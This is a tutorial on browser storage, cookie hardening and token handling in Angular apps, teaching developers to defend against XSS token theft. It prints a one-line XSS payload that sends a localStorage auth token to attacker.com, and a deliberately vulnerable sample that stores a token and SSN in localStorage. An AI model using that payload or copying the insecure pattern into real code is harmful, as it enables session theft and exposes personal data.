# Browser Storage, Session Management, and Token Security

> **Phase:** 4 — Security and Testing  
> **Related:** [authentication-authorization.md](./authentication-authorization.md) | [frontend-security.md](./frontend-security.md) | [secure-api-integration.md](./secure-api-integration.md)

---

## Table of Contents

1. [Learning Objectives](#learning-objectives)
2. [Prerequisites](#prerequisites)
3. [The Storage Matrix: Evaluating Browser Storage Options](#the-storage-matrix-evaluating-browser-storage-options)
4. [The Fatal Flaw of `localStorage` for Authentication Tokens](#the-fatal-flaw-of-localstorage-for-authentication-tokens)
5. [Hardening Cookies: Modern Cookie Security Flags](#hardening-cookies-modern-cookie-security-flags)
   - `HttpOnly`
   - `Secure`
   - `SameSite` (`Strict`, `Lax`, `None`)
   - Hardened Cookie Prefixes (`__Host-` and `__Secure-`)
6. [Architectural Pattern: In-Memory Token Storage with Silent Refresh](#architectural-pattern-in-memory-token-storage-with-silent-refresh)
7. [Cross-Tab Session Synchronization via `BroadcastChannel`](#cross-tab-session-synchronization-via-broadcastchannel)
8. [Session Inactivity Tracking & Auto-Logout](#session-inactivity-tracking--auto-logout)
9. [Vulnerable vs Secure Code Implementations](#vulnerable-vs-secure-code-implementations)
10. [Common Mistakes and Security Misconceptions](#common-mistakes-and-security-misconceptions)
11. [Senior Interview Questions with Detailed Answers](#senior-interview-questions-with-detailed-answers)
12. [Hands-On Exercise: Implementing In-Memory Token Manager & Inactivity Watcher](#hands-on-exercise-implementing-in-memory-token-manager--inactivity-watcher)
13. [Revision Checklist](#revision-checklist)

---

## Learning Objectives

- Evaluate browser storage mechanisms (`localStorage`, `sessionStorage`, `IndexedDB`, HTTP cookies, in-memory) across security, lifespan, and access boundaries.
- Explain why storing sensitive JWTs or credentials in `localStorage` makes an application completely vulnerable to token theft via Cross-Site Scripting (XSS).
- Configure production cookie flags (`HttpOnly`, `Secure`, `SameSite`) and use modern cookie prefixes (`__Host-`).
- Architect a zero-storage frontend authentication lifecycle: short-lived access tokens stored in memory paired with HttpOnly refresh cookies.
- Implement reliable cross-tab session synchronization using the `BroadcastChannel` API.
- Implement an automated inactivity timer to log users out securely after a designated idle period.

---

## The Storage Matrix: Evaluating Browser Storage Options

| Mechanism | Storage Limit | Accessible to JavaScript? | Included Automatically in HTTP Requests? | Cleared When? | Security Risk Level |
|---|---|---|---|---|---|
| **`localStorage`** | ~5MB–10MB | Yes (`window.localStorage`) | No | Only explicit deletion or clearing browser data | **Critical:** Completely vulnerable to XSS token theft |
| **`sessionStorage`** | ~5MB–10MB | Yes (`window.sessionStorage`) | No | When browser tab closes | **High:** Vulnerable to XSS in that active tab |
| **`IndexedDB`** | >250MB | Yes (`window.indexedDB`) | No | Persistent across sessions | **Critical:** Accessible to any script running on the origin |
| **In-Memory (JS Variables / Signals)** | RAM limit | Yes, within application runtime scope | No | On page refresh or tab close | **Lowest:** Resistant to persistent token harvesting |
| **HttpOnly Cookie** | ~4KB | **NO** (Blocked from JS runtime) | Yes (by browser network stack) | Based on `Max-Age` / `Expires` or session | **Safest against XSS:** Malicious scripts cannot read the cookie string |

---

## The Fatal Flaw of `localStorage` for Authentication Tokens

### Threat Scenario: The 1-Line Token Stealer
Many developers casually store JWT access tokens or refresh tokens in `localStorage`:
```javascript
localStorage.setItem('auth_token', token);
```
If an attacker finds a single Cross-Site Scripting (XSS) flaw anywhere on your domain — or inside any third-party npm package, analytics script, or CDN widget — the attacker can execute:
```javascript
// Attacker XSS payload:
fetch('https://attacker.com/steal?t=' + localStorage.getItem('auth_token'));
```
The attacker now possesses the persistent user token, can clone their session, impersonate the user, and bypass all frontend controls indefinitely until the token expires.

### Security Guidance from OWASP
> **OWASP Recommendation:** "Do not store session identifiers or sensitive authentication tokens in local storage or session storage. Storing sensitive data in HTML5 Web Storage makes it immediately accessible to any XSS exploit."

---

## Hardening Cookies: Modern Cookie Security Flags

To protect session identifiers and tokens from theft and cross-site forgery, set cookies from the server with all four modern security attributes:

```http
Set-Cookie: __Host-auth_session=s%3Axyz...; Path=/; Secure; HttpOnly; SameSite=Strict
```

### 1. `HttpOnly`
Tells the browser that JavaScript code (`document.cookie`) **cannot** read or write this cookie. Even if an attacker executes an XSS payload, they cannot extract the cookie string.

### 2. `Secure`
Ensures the cookie is only transmitted over encrypted `HTTPS` connections. Never sent over plain HTTP, preventing man-in-the-middle network sniffing.

### 3. `SameSite` Attribute
Controls whether the cookie is sent along with cross-site requests (protecting against CSRF):
- `SameSite=Strict`: The cookie is **never** sent on cross-site requests (even following a link from an external email or site).
- `SameSite=Lax`: Safe default. Cookie is withheld on cross-site subresource requests (images, iframes), but sent on top-level safe navigation (clicking a link).
- `SameSite=None`: Cookie is sent on all cross-site requests. **Must** be paired with `Secure`.

### 4. Hardened Cookie Prefixes (`__Host-` and `__Secure-`)
Subdomains on the same root domain can sometimes overwrite cookies on parent domains (cookie tossing attack). Cookie prefixes enforce strict browser validation:
- **`__Host-` Prefix:**
  - Must have the `Secure` flag.
  - Must originate from a secure HTTPS origin.
  - Must NOT include a `Domain` attribute (locking it strictly to the current host, preventing subdomain tampering).
  - Must have `Path=/`.
  
*Example:* `Set-Cookie: __Host-sessionId=123; Secure; Path=/; HttpOnly; SameSite=Strict`

---

## Architectural Pattern: In-Memory Token Storage with Silent Refresh

The gold standard for modern Single Page Applications:

```
[ User Logs In ]
  ├── 1. POST /api/auth/login
  ├── 2. Backend responds with:
  │      ├── JSON Body: { accessToken: "short-lived-jwt (15 mins)" }
  │      └── Set-Cookie Header: __Host-refreshToken=xyz; HttpOnly; Secure; SameSite=Strict; Path=/api/auth
  │
[ Angular Runtime ]
  ├── 3. Angular stores accessToken strictly IN-MEMORY (Signal or private variable)
  ├── 4. HTTP Interceptor attaches accessToken to Authorization header
  │
[ Access Token Nears Expiration (e.g. 14 mins) ]
  ├── 5. Angular automatically triggers silent refresh: POST /api/auth/refresh
  ├── 6. Browser attaches HttpOnly __Host-refreshToken automatically
  └── 7. Server verifies refresh token, rotates it, and returns new short-lived accessToken
```

### Why This Is Secure:
1. If an XSS vulnerability occurs, the attacker cannot read the refresh token because it is in an `HttpOnly` cookie.
2. The access token exists only in JavaScript memory and expires within minutes.
3. Refresh tokens are restricted to the `/api/auth` path.

---

## Cross-Tab Session Synchronization via `BroadcastChannel`

When a user opens multiple tabs of an enterprise Angular application, signing out or refreshing tokens in one tab must instantly synchronize across all open tabs without requiring full page reloads:

```typescript
import { Injectable, signal, effect } from '@angular/core';

export type AuthSyncMessage = 
  | { type: 'LOGOUT' }
  | { type: 'TOKEN_REFRESHED'; expiresAt: number };

@Injectable({ providedIn: 'root' })
export class SessionSyncService {
  private channel = new BroadcastChannel('auth_session_channel');

  constructor() {
    this.channel.onmessage = (event: MessageEvent<AuthSyncMessage>) => {
      this.handleIncomingSync(event.data);
    };
  }

  notifyLogout(): void {
    this.channel.postMessage({ type: 'LOGOUT' });
  }

  notifyTokenRefreshed(expiresAt: number): void {
    this.channel.postMessage({ type: 'TOKEN_REFRESHED', expiresAt });
  }

  private handleIncomingSync(msg: AuthSyncMessage): void {
    switch (msg.type) {
      case 'LOGOUT':
        // Clear local memory and redirect to login
        console.log('[AuthSync] Logout received from another tab. Logging out...');
        window.location.href = '/login';
        break;
      case 'TOKEN_REFRESHED':
        console.log('[AuthSync] Session renewed by another tab');
        break;
    }
  }

  destroy(): void {
    this.channel.close();
  }
}
```

---

## Session Inactivity Tracking & Auto-Logout

Enterprise regulations (HIPAA, PCI-DSS, SOC 2) mandate that applications terminate user sessions after a period of user inactivity (e.g., 15 minutes):

```typescript
import { Injectable, inject, NgZone, signal } from '@angular/core';
import { Router } from '@angular/router';

@Injectable({ providedIn: 'root' })
export class InactivityService {
  private router = inject(Router);
  private ngZone = inject(NgZone);

  private timeoutMs = 15 * 60 * 1000; // 15 minutes
  private timerId?: any;

  initWatcher(): void {
    // Run outside Angular zone to avoid triggering change detection on every mouse move!
    this.ngZone.runOutsideAngular(() => {
      const userActivityEvents = ['mousedown', 'keydown', 'scroll', 'touchstart'];
      for (const event of userActivityEvents) {
        window.addEventListener(event, () => this.resetTimer(), { passive: true });
      }
      this.resetTimer();
    });
  }

  private resetTimer(): void {
    if (this.timerId) {
      clearTimeout(this.timerId);
    }
    this.timerId = setTimeout(() => {
      // Re-enter Angular zone to perform logout and UI update
      this.ngZone.run(() => {
        this.performAutoLogout();
      });
    }, this.timeoutMs);
  }

  private performAutoLogout(): void {
    console.warn('[Session] User idle timeout reached. Auto-logging out.');
    this.router.navigate(['/login'], { queryParams: { reason: 'session_expired' } });
  }
}
```

---

## Vulnerable vs Secure Code Implementations

### Vulnerable: Storing Sensitive User Information in Web Storage
```typescript
// ⚠️ VULNERABLE: Sensitive PII and tokens stored in plaintext in localStorage
loginSuccess(response: { token: string; ssn: string; role: string }) {
  localStorage.setItem('auth_token', response.token);
  localStorage.setItem('user_ssn', response.ssn);
  localStorage.setItem('user_role', response.role);
}
```

### Secure: In-Memory Holding with Scoped Service
```typescript
// SECURE: Token lives only in memory service; cleared on window close
@Injectable({ providedIn: 'root' })
export class TokenStorageService {
  private inMemoryAccessToken: string | null = null;

  setAccessToken(token: string): void {
    this.inMemoryAccessToken = token;
  }

  getAccessToken(): string | null {
    return this.inMemoryAccessToken;
  }

  clear(): void {
    this.inMemoryAccessToken = null;
  }
}
```

---

## Common Mistakes and Security Misconceptions

### Misconception 1: "Encrypting tokens inside localStorage makes it secure."
If you encrypt data in `localStorage` using a key stored in JavaScript code, an attacker executing an XSS payload can simply call the same decryption function or extract the encryption key from memory!

### Misconception 2: "sessionStorage is secure because it disappears when the tab closes."
While the tab is open, any script running in the tab has full access to `sessionStorage`. An XSS payload can read it instantaneously and transmit it to an attacker's server.

---

## Senior Interview Questions with Detailed Answers

### Q1: Why should Single Page Applications avoid storing JWTs in `localStorage`? What is the recommended alternative?
**Answer:**
`localStorage` has no access restrictions against any JavaScript running on the same origin. Any successful Cross-Site Scripting (XSS) attack — whether via a malicious template injection, a compromised third-party npm package, or an untrusted external script — can execute `localStorage.getItem()` and immediately exfiltrate the token to an external server.
**Recommended alternative:**
1. Keep the short-lived access token (e.g. valid for 10–15 minutes) **strictly in JavaScript memory** (inside a singleton Angular service).
2. Store the long-lived refresh token in an **`HttpOnly`, `Secure`, `SameSite=Strict` cookie** with the `__Host-` prefix set by the backend server.
3. Because JavaScript cannot access `HttpOnly` cookies, an XSS attacker cannot steal the refresh token. When the in-memory access token expires, Angular triggers a silent refresh call to `/api/auth/refresh`, and the browser automatically sends the secure cookie.

---

### Q2: What security advantages do the `__Host-` and `__Secure-` cookie prefixes provide?
**Answer:**
By default, any subdomain (such as `vulnerable.app.com`) can set a cookie for its parent domain (`app.com`) or overwrite existing cookies, leading to cookie tossing and session fixation attacks.
Cookie prefixes instruct modern browsers to enforce strict creation rules:
- **`__Secure-`:** The cookie MUST be set over HTTPS with the `Secure` flag.
- **`__Host-`:** Goes even further:
  - Must be set with the `Secure` flag over HTTPS.
  - Must have `Path=/`.
  - Must NOT set a `Domain` attribute. This guarantees the cookie can ONLY be read or modified by the exact origin that set it, completely isolating it from subdomains.

---

## Hands-On Exercise: Implementing In-Memory Token Manager & Inactivity Watcher

Review the following functional HTTP Interceptor that attaches the in-memory token and seamlessly handles 401 Unauthorized by executing a token refresh:

```typescript
import { HttpInterceptorFn, HttpErrorResponse } from '@angular/common/http';
import { inject } from '@angular/core';
import { catchError, switchMap, throwError } from 'rxjs';
import { TokenStorageService } from './token-storage.service';
import { AuthService } from './auth.service';

export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const tokenStorage = inject(TokenStorageService);
  const authService = inject(AuthService);

  const token = tokenStorage.getAccessToken();
  let authReq = req;

  if (token) {
    authReq = req.clone({
      setHeaders: { Authorization: `Bearer ${token}` }
    });
  }

  return next(authReq).pipe(
    catchError((error: HttpErrorResponse) => {
      // If 401 and not already attempting to refresh
      if (error.status === 401 && !req.url.includes('/api/auth/refresh')) {
        return authService.refreshToken().pipe(
          switchMap(newToken => {
            tokenStorage.setAccessToken(newToken);
            const retryReq = req.clone({
              setHeaders: { Authorization: `Bearer ${newToken}` }
            });
            return next(retryReq);
          }),
          catchError(refreshErr => {
            authService.logout();
            return throwError(() => refreshErr);
          })
        );
      }
      return throwError(() => error);
    })
  );
};
```

---

## Revision Checklist

- [ ] Explain why `localStorage` is vulnerable to XSS token theft.
- [ ] Understand all cookie attributes: `HttpOnly`, `Secure`, `SameSite=Strict/Lax/None`.
- [ ] Implement `__Host-` cookie prefixes and understand their subdomain-isolation benefits.
- [ ] Explain the in-memory access token + HttpOnly refresh cookie architectural pattern.
- [ ] Implement cross-tab logout synchronization using `BroadcastChannel`.
- [ ] Set up user inactivity tracking outside `NgZone` to protect application responsiveness.
